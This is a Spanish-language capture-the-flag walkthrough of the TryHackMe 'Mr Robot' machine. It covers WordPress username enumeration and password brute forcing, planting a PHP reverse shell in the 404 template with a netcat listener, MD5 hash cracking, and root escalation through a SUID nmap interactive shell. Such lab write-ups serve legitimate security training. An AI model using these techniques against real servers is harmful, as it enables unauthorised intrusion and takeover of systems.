# Mr Robot


Dificultad -> Medium

Enlace a la máquina -> [TryHackme](https://tryhackme.com/room/mrrobot)

-----------
## WriteUp Mr Robot
Para trabajar de forma ordenada, vamos a crear un directorio de trabajo llamado como el nombre de la Máquina. Nos meteremos en el directorio creado y vamos a crear en principio 3 carpetas para empezar a trabajar. Nos meteremos en el directorio nmap y ahora ya sí, empezamos con la fase de reconocimiento

```bash
mkdir <Nombre_CTF>
cd !$
mkdir {nmap,content,exploit}
cd nmap
```
Empezamos esta fase de Reconocimiento, comprobando la conectividad con la máquina ojetivo. Vamos a envíar un paquete y analizar la respuesta. Como vemos en la siguiente imagen, se envía un paquete y se recibe un paquete, lo que indica que la máquina está activa. También fijándonos en el valor del TTL, podemos intuir que estamos ante un Linux. Este valor puede modificarse, pero de normal, si es de 64 o cercano a él, estaremos ante un Linux; y si es de 128 o cercano a él, estaremos ante un Windows. 

```bash
ping -c 1 <IP_Objetivo>
```


La primera tarea, es ver qué puertos tiene esta máquina abiertos. Para ello vamos a emplear nmap con el siguiente comando 

```bash
sudo nmap -p- --open -sS -vvv -n -Pn <IP_Objetivo> -oG <Nombre_archivo>
```

- Parámetos de nmap
  - *-p-* Escanea el rango total de puertos (65535). 
  - *--open* Nos reportará solo los puertos abiertos. 
  - *-sS* (TCP SYN), también conocido como TCP SYN scan o Half-Open Scan. Es un tipo de escaneo más sigiloso que otro tipo de escaneos ya que no completa la conexión TCP, evitando en gran medida que se registre en los logs del sistema objetivo. Sin embargo, algunos sistemas de seguridad si que pueden detectar este tipo de escaneo y tomar medidas.
  - *-vvv* Triple verbose, para ver en consola lo que vaya encontrando nmap
  - *-n* Para no aplicar resolución DNS 
  - *-Pn* No realiza detección de Host. Con este parámetro nmap asumirá que los Host especificados están activos. 
  - *-oG* Genera un archivo de salida en formato Greppable, con el nombre que le hayamos especificado

Para ver los resultados podemos hacerle un cat al archivo generado. 



Como vemos hay 2 puertos abiertos. El puerto 80 HTTP y el puerto 443 HTTPS. Con está información, vamos a realizar un segundo escaneo de nmap para tratar de determinar el servicio y la versión que corren en los puertos especificados(Cada uno de los puertos separados por ,)

```bash
nmap -sC -sV -p<Puertos_a_Escanear> <IP_Objetivo> -oN <Nombre_Archivo>
```
Si le hacemos un cat al archivo generado, veremos más información. En principio poco más que destacar que se está ejecutando un Servidor Apache. 


Siguiendo con la enumeración vamos a emplear whatweb para ver qué tecnologías corren por detrás del sitio web, así como el CMS, en caso de que se esté utilizando uno. 

```bash
whatweb http://<IP_Objetivo>:80
```

Entre las cosas a destacar, vemos que como CMS se está empleando WordPress. De igual forma podemos ver está información desde la extensión Wappalyzer del navegador. 


En cuanto a la enumeración del sitio web, poco que resaltar. Una temática muy guapa en relación a la serie MR.Robot y poco más. Podemos revisar el código (CTRL + U), Inspecionar la página (F12), pero en principio no vemos nada raro. Antes de pasar a realizar Fuzzing Web para tratar de enumerar directorios ocultos y demás, siempre me gusta comprobar de forma manual alguno de ellos. Uno de los obligatorios seguramente sea el archivo "robots.txt", así que vamos a ver que nos encontramos 

```
http://<IP_Objetivo>:80/robots.txt
```

Vemos lo que parecen ser dos archivos que se alojan en el servidor, así que vamos a ver si podemos ver su contenido o mejor aún, descargarlo a nuestro equipo con wget en el directorio de trabajo content. 

```bash
wget http://<IP_Objetivo>:80/fsocity.dic -o ~/Mr_Robots/content/fsocity.dic
```
Si le hacemos un cat al archivo generado, podremos ver que se trata aparentemente de un diccionario o algo similar. 

Ahora vamos a hacer lo mismo pero con el otro archivo que nos reveló robots.txt 

```bash
wget http://<IP_Objetivo>:80/key-1-of-3.txt -o ~/Mr_Robots/content/key-1-of-3.txt
```
Si le hacemos un cat a este archivo, vemos lo que parece ser la primera key que debemos poner a las preguntas de TryHackme. Pues nada, la copiamos y la pegamos en la plataforma y ya está. 

Estabamos con Fuzzing Web manual (por llamarlo de alguna forma), y otro directorio o archivo que se nos puede ocurrir probar antes de utilizar herramientas como gobuster, dirbuster, etc. o incluso el script http_enum de namp, es probar la siguiente ruta, ya que el CMS es Wordpress.

```
http://<IP_Objetivo>:80/wp-admin
```
Existen otras posibles alternativas (admin, wp-login, login.php, etc.) En este caso, wp-admin nos funciona, por lo que guay. Y si no, pues como comentábamos antes, podemos tirar de Fuzzing Web con herramientas especializadas y diccionarios especializados en descubrimiento de directorios. Para esta tarea me gusta también empezar siempre con el script de nmap http_enum (que emplea un diccionario de directorios comunes y no muy extenso, unas 1000 palabras o así) y luego ya emplear otras herramientas con diccionarios más potentes quizás. De hecho, al final de la explicación hemos añadido un sección llamada Ruta Alternativa, en la que vamos a vulnerar el sistema de forma alternativa a la explicada a continuación y para ello si que aplicaremos Fuzzing Web. 

Como vemos en la imagen, tenemos acceso al Panel de Login de Wordpress, pero de momento no tenemos credenciales válidas. No Problem, por que vamos a solucionar esto rápido. En algunos casos, si el Panel de Login no está bien montado, puede darnos información importante. Teniendo la lista de palabras que descargábamos anteriormente, vamos a emplearlas para aplicar fuerza bruta y ver si el servidor nos responde algo distinto con alguno de los nombres de usuarios contenidos en el diccionario. Para ello vamos a utilizar la herramienta Burpsuite. Debemos tenerlo configurado y hacer uso de la extensión FoxyProxy para poder capturar la petición. Muy rápidamente (puesto que no es el proposito de este WriteUp) explicaremos los pasos a seguir para capturar la petición 

- Capturar Petición con Burpsuite
    - Abrimos Burpsuite 
    ```bash
    burpsuite 2>/dev/null & disown 
    ```
    - Activamos FoxyProxy en el navegador
    - En Burpsuite, "Proxy-Intercept-Intercept is on"
    - Ya con esto preparado, ahora sí, interceptamos la petición de inicio de sesión ingresando un usuario y una contraseña al azar. Si ahora vemos Burpsuite veremos que la petición ha sido interceptada.

Una vez tenemos capturada la petición, con CTRL + I la envíamos al Intruder. Ya en la pestaña de Intruder, vamos a seleccionar el nombre de usuario que introducimos al azar y le vamos a dar a lo siguiente 

![Descripción de la imagen](TryHackme/MR Robot/24.jpeg)


Ahora pinchamos en la pestaña Payloads, y cargamos el diccionario que encontramos anteriormente (fsociety.dic). Ya solo nos queda iniciar el ataque. Antes de ello, tenemos que deshabilitar o desmarcar el URL encode (Abajo, en la parte Payload Encoding, simplemente desmarcamos esa casilla). Para empezar el ataque pinchamos sobre Start Attack

Si analizamos los resultados y filtramos por Length, podremos ver que hay uno diferente, que es Elliot (Si hemos visto la serie no nos sorprenderá)

Pues bueno, ahora lo que vamos a hacer, ya cerrando Burpsuite y quitando el FoxyProxy, es comprobar que efectivamente el usuario Elliot es válido. ¿Cómo? Pues vamos al panel de Login, ponemos como usuario Elliot y como contraseña lo que queramos. Vamos a ver algo curioso. 

Vemos que nos dice que la contraseña para el usuario Elliot no es válida. Mientras que si probamos a iniciar sesión con el nombre de usuario "abcde" (que es un usuario que no existe), recibiremos el mensaje de que el nombre de usuario no es válido. Esto quiere decir que Elliot es un nombre de usuario válido. Pues bueno ya tenemos un usuario. Nos queda averiguar la contraseña. Para esto, utilizaremos la herramienta wpscan. Vamos a utilizar el siguiente comando

```bash
wpscan --url http://[IPvictima]/wp-login.php -U [Usuario] -P [ruta/diccionario]
```

Como vemos, wpsscan ha sido capaz de identificar las credenciales. Esta es otra forma de poder conseguir tanto el usuario como la contraseña, con la que ahora sí, retomamos para loguearnos en el panel de administración de WordPress y continuar con el CTF. 

Lo primero que se nos ocurre obviamente es subir un archivo .php que nos otorgue una Reverse Shell. Pues para ello vamos al apartado Apariencia-Editor. Vamos a modificar la plantilla 404, borrar todo el contenido, y meterle un código que nos interese. Como hemos hecho otras veces, vamos a utilizar el siguiente payload.

```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
Lo editamos, poniendo nuestra dirección IP de atacantes y el puerto en el que estaremos en escucha por netcat, le damos a Update File para guardar los cambios

Ahora en la terminal, nos ponemos en escucha por netcat en el puerto especificado con el siguiente comando

```bash
nc -nlvp [Puerto]
```
Ahora tenemos que ejecutar de alguna forma el payload. Desde el navegador, buscamos la siguiente dirección siguiendo la ruta de la plantilla 404

```
http://[IPvictima]/wp-content/themes/twentyfifteen/404.php
```

Lo primero que haremos como siempre que ganamos acceso a un sistemas, es spawnearnos una Shell con Python y el módulo pty, para ello utilizamos el siguiente comando

```python
python -c 'import pty; pty.spawn("/bin/bash)'
```

Para poder limpiar la pantalla con CTRL + L ejecutamos el siguiente comando

```bash
export TERM=xterm
```

Si vamos al directorio /home/robot, podremos encontrar dos archivos, de los cuales, uno es la segunda key.

Si intentamos hacerle un cat veremos que no podemos ver el contenido, no tenemos permiso, ya que el archivo pertenece al usuario robot. Sin embargo, el otro archivo, vemos por su nombre que es la contraseña en formato MD5 y que está configurado para que todos los usuarios puedan leerlo. Pues nos va a tocar descifrar la contraseña en este caso con nuestro querido John

Podemos hacerle un cat al archivo para ver el contenido y poder copiarlo a nuestro equipo para descifrarlo con john. Ya en nuestro equipo, creamos un archivo llamado igual que le nombre del archivo por ejemplo y le pegamos el hash. Ahora ya sí, vamos a descifrarlo con John. Para ello ejecutamos el siguiente comando

```bash
john --format=raw-md5 [archivo] --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=raw-md5 [archivo]
``` 

Ya tenemos las credenciales del usurio robot, por lo que podemos cambiarnos a este usuario y leer la segunda key para la cual de primeras no teníamos permisos

```bash
su robot
```

Ingresamos la contraseña y ahora somos el usuario robot. Si ahora le hacemos un cat al archivo key-2-of-3.txt, si que tendremos permisos para leerlo ya que ahora si somos el usuario robot

Ya por último nos queda escalar privilegios como root para conseguir la tercera key. Lo que vamos a hacer es buscar binarios con el bit SUID activo. Para ello vamos a ejecutar el siguiente comando

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

De todos estos binarios, nos llama la atención y nos fijamos en nmap. De hecho comprobamos la versión de nmap con el siguiente comando

```bash
nmap -v
```

Podemos ver que es la versión 3.81, que admite el modo interactivo que permite el uso de comandos de shell. Podemos utilizar esto para escalar privilegios de la siguiente forma

```bash
nmap --interactive
```

Si ahora ejecutamos alguno de estos comandos para ejecutar una sh o una bash (según preferencias personales), seremos usuario root 

```
!sh
!bash
```
Ahora simplemente tenemos que dirigirnos al directorio personal de /root y hacerle un cat al archivo key-3-of-3.txt


### Método Alternativo de Intrusión
Como comentábamos más arriba, existe un método alternativo de vulnerar está máquina y es el siguiente. Retomamos justo en el punto en el que estábamos analizando el sitio web que corre en el puerto 80, y en este caso lo que vamos a aplicar es Fuzzing Web con todas las de la ley. Para ello vamos a emplear gobuster

```bash
gobuster dir -u http://<IP_Objetivo>:80 -w /ruta/al/diccionario.txt -o <Nombre_Archivo>
```
- Parámetros Gobuster
  - *dir* Para encontrar directorios
  - *-u* Para indicar la URL
  - *-w* Para indicar el diccionario empleado. En nuestro caso /usr/share/wordlist/dirbuster/directory-list-2-3-medium.txt
  - *-o* Guarda los resultados en el archivo especificado.

 Si le hacemos un cat al archivo generado, podremos ver los resultados. Vamos a ver muchos directorios interesantes a inspeccionar, pero centrándonos en la resolución de la máquina, si inspeccionamos el siguiente directorio vamos a ver cosas interesantes 

 ```
 http://[IPvictima]:80/license
 ```
 Vemos un mensaje un tanto extraño, señalando a principiantes. Si inspeccionamos el código, y bajamos hacia abajo, vamos a ver otro comentario que nos dice que si buscamos una contraseña o algo. Si continuamos hacia más abajo, vamos a ver una cadena bastante extraña, que parece estar codificada en Base64. Pues lo que vamos a hacer, es copiarla y en nuestra terminal ejecutamos el siguiente comando 

 ```bash
 echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
 ```
 Como vemos, al decodificarla, nos mostrará en texto claro las credenciales del usuario elliot, que nos sirven para burlar el panel de WordPress. A partir de aquí, el método de intrusión sería continuar con la subida de un archivo PHP malicioso que nos de una Reverse Shell y luego ir escalando privilegios como hemos ido viendo anteriormente.  

 
